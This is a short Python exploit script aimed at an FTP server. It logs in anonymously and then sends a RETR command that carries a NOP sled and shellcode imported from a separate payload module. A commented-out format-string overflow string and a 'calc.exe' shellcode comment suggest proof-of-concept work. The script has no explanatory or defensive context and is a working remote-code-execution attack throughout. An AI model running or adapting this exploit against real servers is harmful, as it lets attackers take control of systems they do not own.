import socket
import os
import sys

import socket
import struct
from struct import pack
from payload import buf
def shell_attack(target_machine, target_port):

    ip = target_machine
    port = target_port
  
    nop = b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
    #overflow = '%8x%8x%8x%8x%8x%8x%8x%8x%341901090x%n%8x%8x%24954x%n%x%x%x%n\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'

    #shellcode calc.exe
    

    remotecode =  nop + buf + b'\r\n'
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip ,port))
    s.recv(1024)
    s.send(b'USER anonymous\r\n')
    s.recv(1024)
    s.send(b'PASSW hacker@hacker.net\r\n')
    s.recv(1024)
   
    message = b'RETR ' + remotecode 
    s.send(message)
    s.recv(1024)
    s.close